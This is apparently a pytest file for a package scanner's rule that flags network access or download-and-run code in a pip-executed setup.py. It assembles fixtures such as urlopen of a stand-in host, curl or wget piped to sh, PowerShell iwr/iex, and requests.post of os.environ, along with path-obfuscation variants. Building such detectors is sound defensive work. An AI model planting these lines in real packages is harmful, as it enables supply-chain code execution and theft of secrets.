"""ESL-001 pypi-install-exec: network or download-and-run in the setup.py pip runs.

Every malicious-looking source is assembled from tokens at test runtime, so no
committed file contains a literal the shipped rules match (see the repo guard in
test_esl003). Hosts are ``example.invalid``; nothing here is ever executed.
"""

from __future__ import annotations

import json
import time
from pathlib import Path

import jsonschema
import pytest
from builders import TarItem, ZipItem, make_tar, make_zip

import eslabon.cli as cli
from eslabon import archive, yara_engine
from eslabon.model import Limits, Member, PackageRef, ScanContext

SCHEMA = json.loads(
    (Path(__file__).parent.parent / "schema" / "event.schema.json").read_text("utf-8")
)
NL = chr(10)
URLOPEN = "url" + "open"
URLLIB_REQ = "urllib" + ".request"
HTTP_CLIENT = "http" + ".client"
REQ = "requests" + "."
SOCK = "socket" + ".socket"
SUBP = "sub" + "process."
OS_SYSTEM = "os" + ".system"
OS_POPEN = "os" + ".popen"
CURL = "cu" + "rl"
WGET = "wg" + "et"
EVIL = "https" + "://example.invalid/stage2"
META_URL = "https" + "://github.com/x/y"


def _setup(*body: str) -> bytes:
    lines = [
        "import os",
        "from setuptools import setup",
        "",
        *body,
        "",
        "setup(",
        "    name='demo',",
        "    version='0.0.1',",
        "    url='" + META_URL + "',",
        "    project_urls={'Source': '" + META_URL + "'},",
        ")",
        "",
    ]
    return NL.join(lines).encode("ascii")


def _urlopen_setup() -> bytes:
    return _setup(
        "from " + URLLIB_REQ + " import " + URLOPEN,
        "",
        "payload = " + URLOPEN + "('" + EVIL + "').read()",
    )


def _ctx(ecosystem: str = "pypi", kind: str = "") -> ScanContext:
    pkg = PackageRef("demo", "0.0.1", ecosystem, "")
    if not kind:
        kind = "npm" if ecosystem == "npm" else "sdist"
    return ScanContext(rules=_RULES, limits=Limits(), pkg=pkg, archive_kind=kind)


_RULES = yara_engine.compile_rules()


def _scan(
    path: str, data: bytes, raw: str = "", ecosystem: str = "pypi", kind: str = ""
):
    m = Member(index=2, path=path, data=data, raw_path=raw or path)
    return yara_engine.scan_member(m, _ctx(ecosystem, kind))


def _ids(found) -> list[str]:
    return [f.rule_id for f in found]


# ------------------------------------------------------------ positives ----


def test_setup_urlopen_fires():
    found = _scan("demo-0.0.1/setup.py", _urlopen_setup())
    assert _ids(found) == ["ESL-001"]
    f = found[0]
    assert f.file == "demo-0.0.1/setup.py"
    assert f.member_index == 2
    assert f.line == 4  # the import line: the first matching instance wins
    assert f.match_count == 2  # the import and the call
    assert URLOPEN in f.snippet
    # a bare setup.py at the archive root is the one pip runs too
    assert _ids(_scan("setup.py", _urlopen_setup())) == ["ESL-001"]


def test_setup_subprocess_curl_fires():
    src = _setup(
        "import " + SUBP[:-1],
        SUBP + "check_call(['" + CURL + "', '-sSL', '-o', '/tmp/x', '" + EVIL + "'])",
    )
    found = _scan("demo-0.0.1/setup.py", src)
    assert _ids(found) == ["ESL-001"]
    assert found[0].line == 5
    assert found[0].match_count == 1  # the metadata URLs below add nothing


@pytest.mark.parametrize(
    "line",
    [
        "import " + URLLIB_REQ,
        "import os, sys, " + URLLIB_REQ,
        "from " + URLLIB_REQ + " import urlretrieve",
        URLLIB_REQ + ".url" + "retrieve('" + EVIL + "', 'x')",
        "data = urllib2." + URLOPEN + "(u)",
        "r = " + REQ + "get('" + EVIL + "')",
        "r = " + REQ + "post (u, data=os.environ)",
        "s = " + SOCK + "(2, 1)",
        "import " + HTTP_CLIENT,
        "from " + HTTP_CLIENT + " import HTTPSConnection",
        "c = " + HTTP_CLIENT + ".HTTPSConnection('example.invalid')",
        OS_SYSTEM + "('" + CURL + " -s " + EVIL + " | sh')",
        OS_POPEN + "(\"" + WGET + " -q -O- " + EVIL + "\").read()",
        SUBP + "run(['power" + "shell', '-c', 'iwr'])",
        SUBP + "Popen('Power" + "Shell -NoP -c iex')",
        SUBP + "call(['pip', 'install', '" + EVIL + "'])",
        "if 1: " + SUBP + "run(('" + WGET + "' ,u))",
        SUBP + "run(['POWER" + "SHELL', '-c', 'iwr'])",
        SUBP + "run(['pw" + "sh', '-c', 'iwr'])",
        SUBP + "run([shutil.which('" + CURL + "'), '" + EVIL + "'])",
        SUBP + "run([str(x), '" + CURL + "', '" + EVIL + "'])",
        "s = " + "socket" + ".create_connection(('example.invalid', 443))",
    ],
)
def test_other_shapes_fire(line):
    assert _ids(_scan("demo-0.0.1/setup.py", _setup(line))) == ["ESL-001"]


def test_black_formatted_subprocess_call_fires():
    src = _setup(
        SUBP + "check_call(",
        "    [",
        "        '" + CURL + "',",
        "        '" + EVIL + "',",
        "    ]",
        ")",
    )
    found = _scan("demo-0.0.1/setup.py", src)
    assert _ids(found) == ["ESL-001"]
    assert found[0].line == 4
    crlf = src.replace(b"\n", b"\r\n")
    assert _ids(_scan("demo-0.0.1/setup.py", crlf)) == ["ESL-001"]


# ----------------------------------------------------------- near-misses ----


def test_requests_style_version_exec_silent():
    src = _setup(
        "about = {}",
        "here = os.path.abspath(os.path.dirname(__file__))",
        "with open(os.path.join(here, 'src', 'x', '__version__.py')) as f:",
        "    " + "ex" + "ec(f.read(), about)",
        "ex" + "ec(open('src/x/__version__.py').read(), about)",
    )
    assert _scan("requests-2.0/setup.py", src) == []


def test_pg_config_subprocess_silent():
    # psycopg2 / lxml shape, with the metadata URL a few lines below the call
    src = _setup(
        "import " + SUBP[:-1],
        "",
        "ver = " + SUBP + "check_output(['pg_config','--version'])",
        SUBP + "call(['xslt-config', '--libs'])",
        "p = " + SUBP + "Popen([self.pg_config_exe, '--' + attr_name],",
        "                     stdout=" + SUBP + "PIPE)",
        "rev = " + SUBP + "check_output(['git', 'rev-parse', 'HEAD'])",
    )
    assert _scan("psycopg2-2.9/setup.py", src) == []


@pytest.mark.parametrize(
    "line",
    [
        # plain import, no call
        "import " + SUBP[:-1],
        # same line, but the URL is outside the call's parentheses
        SUBP + "check_output(['pg_config']); setup(url='" + META_URL + "')",
        # pycurl: curl-config and helpers named after curl are not a download
        SUBP + "Popen(['" + CURL + "-config', '--version'])",
        SUBP + "check_output([self." + CURL + "_config(), '--libs'])",
        SUBP + "call(['make', 'lib" + CURL + "'])",
        # the URL is in a variable defined on another line
        "U = '" + EVIL + "'",
        # method calls named like the primitives
        "r = session.get('" + EVIL + "')",
        "r = my_" + REQ + "get(u)",
        "x = self." + OS_SYSTEM + "('" + CURL + " x')",
        "s = my." + SOCK + "(2, 1)",
        # a module name in a comment or docstring, not imported or used
        "# see " + URLLIB_REQ + " and " + HTTP_CLIENT + " docs",
        # a download tool named in a string, but no process call
        "NOTE = '" + CURL + " -s " + EVIL + "'",
    ],
)
def test_near_misses_silent(line):
    assert _scan("demo-0.0.1/setup.py", _setup(line)) == []


def test_subprocess_and_url_too_far_apart_silent():
    gap = "x" * 210
    src = _setup(SUBP + "call(['echo', '" + gap + "', '" + EVIL + "'])")
    assert _scan("demo-0.0.1/setup.py", src) == []


# ---------------------------------------------------- path restriction ----


@pytest.mark.parametrize(
    "path",
    ["demo-0.0.1/demo/net.py", "demo-0.0.1/setup.cfg", "demo/__init__.py"],
)
def test_urlopen_outside_setup_py_silent_for_esl001(path):
    assert _scan(path, _urlopen_setup()) == []


@pytest.mark.parametrize(
    "path",
    [
        "pkg/tests/data/setup.py",
        "foo_setup.py",
        "pkg/foo_setup.py",
        "pkg/setup.py.orig",
        "pkg/setup.pyc",
        "a/b/setup.py",
    ],
)
def test_nested_or_prefixed_setup_py_silent(path):
    assert _scan(path, _urlopen_setup()) == []


def test_npm_archive_never_esl001():
    found = _scan("setup.py", _urlopen_setup(), raw="package/setup.py", ecosystem="npm")
    assert found == []


BS = chr(0x5C)
NUL = chr(0)


@pytest.mark.parametrize(
    "raw",
    [
        "pkg-1.0" + BS + "setup.py",
        "pkg-1.0/sub/../setup.py",
        "pkg-1.0/a/b/../../setup.py",
        "pkg-1.0/x" + BS + ".." + BS + "setup.py",
        "pkg-1.0/setup.py" + NUL + ".txt",
        "pkg-1.0/setup.py" + NUL,
        "/pkg-1.0/setup.py",
        "C:pkg-1.0/setup.py",
        "../pkg-1.0/setup.py",
        "pkg-1.0/SETUP.PY",
        "pkg-1.0/setup.py ",
        "pkg-1.0/setup.py.",
    ],
)
def test_rewritten_name_that_can_land_as_setup_py_fires(raw):
    # R32: if ANY reading of the stored name (Windows separators, '..'
    # resolved or dropped, NUL truncation, Win32 case/trailing-dot folding)
    # is the setup.py pip runs, ESL-001 applies.
    path = archive.normalize_path(raw, "pypi")[0]
    assert _ids(_scan(path, _urlopen_setup(), raw=raw)) == ["ESL-001"]


def test_rewritten_name_too_deep_under_every_reading_silent():
    raw = "pkg-1.0/a/b/../c/setup.py"
    path = archive.normalize_path(raw, "pypi")[0]
    assert _scan(path, _urlopen_setup(), raw=raw) == []


def test_path_readings():
    assert archive.path_readings("pkg-1.0/sub/../setup.py") >= {
        "pkg-1.0/setup.py",
        "pkg-1.0/sub/setup.py",
    }
    assert "pkg-1.0/setup.py" in archive.path_readings("pkg-1.0/SETUP.PY ")
    assert "pkg-1.0/setup.py" in archive.path_readings("pkg-1.0/setup.py" + NUL + "x")
    drive_up = "C:" + BS + ".." + BS + "pkg-1.0/setup.py"
    assert "pkg-1.0/setup.py" in archive.path_readings(drive_up)


def test_wheel_setup_py_silent():
    # pip never runs a setup.py shipped inside a wheel (old numpy wheels had one)
    assert _scan("pkg/setup.py", _urlopen_setup(), kind="wheel") == []
    assert _scan("setup.py", _urlopen_setup(), kind="wheel") == []


def test_unknown_archive_kind_silent():
    m = Member(index=0, path="pkg-1.0/setup.py", data=_urlopen_setup())
    pkg = PackageRef("demo", "0.0.1", "pypi", "")
    c = ScanContext(rules=_RULES, limits=Limits(), pkg=pkg)
    assert c.archive_kind == ""
    assert yara_engine.scan_member(m, c) == []


def test_other_rules_still_apply_outside_setup_py():
    b64 = "b64" + "decode"
    src = _urlopen_setup() + ("ex" + "ec(base64." + b64 + "(s))" + NL).encode("ascii")
    assert _ids(_scan("demo-0.0.1/demo/net.py", src)) == ["ESL-003"]
    assert _ids(_scan("demo-0.0.1/setup.py", src)) == ["ESL-001", "ESL-003"]


# --------------------------------------------------------- performance ----


@pytest.mark.parametrize(
    "unit",
    [
        SUBP + "call([" + " " * 30 + NL,
        SUBP + "call(['" + "a" * 190 + NL,
        OS_SYSTEM + "(" + "[(" * 15 + NL,
        "import " + "a, " * 30 + NL,
        "import " + " " * 60 + NL,
        URLOPEN + " " * 9 + NL,
        REQ + "get" + " " * 9 + NL,
        # newline-free: every hit must not scan a long window of the next ones
        " " + SUBP + "x(",
        " " + OS_SYSTEM + "(' ",
        " " + SUBP + "x(a()",
        " " + SUBP + "x((" + "a" * 30 + ")",
    ],
)
def test_ten_mib_adversarial_input_is_fast(unit):
    data = unit.encode("ascii")
    data = data * (10 * 2**20 // len(data))
    m = Member(index=0, path="demo-0.0.1/setup.py", data=data, raw_path="")
    start = time.perf_counter()
    found = yara_engine.scan_member(m, _ctx())
    elapsed = time.perf_counter() - start
    print(f"10 MiB of {unit[:20]!r}: {elapsed:.2f} s")
    assert elapsed < 6.0  # worst measured 3.4 s; YARA timeout is 10 s
    assert all(f.rule_id == "ESL-001" for f in found)


# ------------------------------------------------------------- end to end ----


def _cli_findings(target: Path, tmp_path: Path) -> tuple[int, list[dict]]:
    out = tmp_path / "out" / (target.name + ".jsonl")
    code = cli.main(["scan", str(target), "--out", str(out), "--ecosystem", "pypi"])
    events = [json.loads(x) for x in out.read_text("ascii").splitlines()]
    for ev in events:
        jsonschema.validate(ev, SCHEMA)
    findings = [e for e in events if e["event"]["dataset"] == "eslabon.finding"]
    return code, findings


def test_cli_legacy_zip_sdist_fires(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    target = tmp_path / "pkg-1.0.zip"
    target.write_bytes(make_zip([ZipItem("pkg-1.0/setup.py", _urlopen_setup())]))
    code, findings = _cli_findings(target, tmp_path)
    assert code == 1
    assert [e["rule"]["id"] for e in findings] == ["ESL-001"]


def test_cli_wheel_setup_py_silent(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    target = tmp_path / "pkg-1.0-py3-none-any.whl"
    target.write_bytes(
        make_zip(
            [
                ZipItem("pkg-1.0.dist-info/METADATA", b"Name: pkg\nVersion: 1.0\n"),
                ZipItem("pkg/setup.py", _urlopen_setup()),
            ]
        )
    )
    code, findings = _cli_findings(target, tmp_path)
    assert findings == []
    assert code == 0


def _sdist(setup_path: str, tmp_path: Path) -> Path:
    tgz = make_tar(
        [
            TarItem(
                "pkg-1.0/PKG-INFO",
                b"Metadata-Version: 2.1\nName: pkg\nVersion: 1.0\n\n",
            ),
            TarItem(setup_path, _urlopen_setup()),
        ]
    )
    target = tmp_path / "pkg-1.0.tar.gz"
    target.write_bytes(tgz)
    return target


def test_cli_end_to_end_setup_py(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    out = tmp_path / "out" / "e.jsonl"
    target = _sdist("pkg-1.0/setup.py", tmp_path)
    code = cli.main(["scan", str(target), "--out", str(out), "--ecosystem", "pypi"])
    assert code == 1
    events = [json.loads(x) for x in out.read_text("ascii").splitlines()]
    for ev in events:
        jsonschema.validate(ev, SCHEMA)
    findings = [e for e in events if e["event"]["dataset"] == "eslabon.finding"]
    assert [e["rule"]["id"] for e in findings] == ["ESL-001"]
    assert findings[0]["eslabon"]["evidence"]["file"] == "pkg-1.0/setup.py"
    assert findings[0]["eslabon"]["evidence"]["line"] == 4


def test_cli_end_to_end_nested_setup_py_silent(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    out = tmp_path / "out" / "e.jsonl"
    target = _sdist("pkg-1.0/tests/data/setup.py", tmp_path)
    code = cli.main(["scan", str(target), "--out", str(out), "--ecosystem", "pypi"])
    events = [json.loads(x) for x in out.read_text("ascii").splitlines()]
    for ev in events:
        jsonschema.validate(ev, SCHEMA)
    findings = [e for e in events if e["event"]["dataset"] == "eslabon.finding"]
    assert [e["rule"]["id"] for e in findings] == []
    assert code == 0
